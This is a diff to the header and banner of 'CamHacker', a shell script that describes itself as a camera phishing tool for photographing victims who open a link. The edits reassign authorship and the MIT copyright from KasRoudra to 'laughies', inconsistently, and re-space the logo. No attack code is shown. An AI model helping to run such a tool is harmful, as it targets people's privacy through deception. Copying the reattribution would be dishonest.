@@ -3,11 +3,11 @@
 # CamHacker
 # Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : Laughies
+# Author     : laughies
 # Github     : https://github.com/laughies
 # Email      : appigowda7338@gmail.com
-# Credits    : Kasrudra, Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 25-02-2024
+# Credits    : Kasroudra, Noob-Hackers, TechChipNet, LinuxChoice
+# Date       : 25/02/2024
 # License    : MIT
 # Copyright  : laughies (2024-2025)
 # Language   : Shell
@@ -17,7 +17,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022 laughies
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -68,9 +68,9 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-${green}   ____                _   _            _
-${red}   /   ___|__ _ _ __ ___| | | | __ _  ___| | _____ _ __
-${cyan}  | |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
+${green}  ____                _   _            _
+${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
+${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
@@ -505,7 +505,7 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
+$red[Author]     ${cyan} :[laughies]
 $red[Github]     ${cyan} :[https://github.com/KasRoudra]
 $red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
 $red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
@@ -658,3 +658,4 @@ while true; do
     fi
     sleep 0.5
 done
+
